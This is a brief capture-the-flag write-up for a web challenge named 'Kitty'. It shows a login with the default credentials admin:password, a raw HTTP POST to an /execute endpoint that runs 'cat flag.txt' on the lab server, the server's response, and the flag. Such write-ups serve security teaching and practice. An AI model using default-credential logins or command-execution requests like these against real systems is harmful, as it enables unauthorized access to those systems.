https://ctftime.org/event/2209/

# Kitty

Tetanus is a serious, potentially life-threatening infection that can be transmitted by an animal bite.

Target : http://45.33.123.243:5020/

## Solution

When you visit the site you are greeted with a login page.

`admin:password` grants you access to `/dashboard` and a valid session cookie.

The dashboard features the ability to "execute" a command with a `POST` to `/execute`:

```
POST /execute HTTP/1.1
Host: 45.33.123.243:5020
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://45.33.123.243:5020/dashboard
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://45.33.123.243:5020
Connection: close
Cookie: session=eyJhdXRoZW50aWNhdGVkIjp0cnVlfQ.Zav1dw.-fJY1q7x8WzeGdAyniHuZQiyr3A

post_input=cat%20flag.txt
```

This returns the flag:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 45
Server: Werkzeug/2.0.3 Python/3.6.15
Date: Sat, 20 Jan 2024 16:32:31 GMT

<pre>KCTF{Fram3S_n3vE9_L1e_4_toGEtH3R}
```

## Flag
`KCTF{Fram3S_n3vE9_L1e_4_toGEtH3R}`
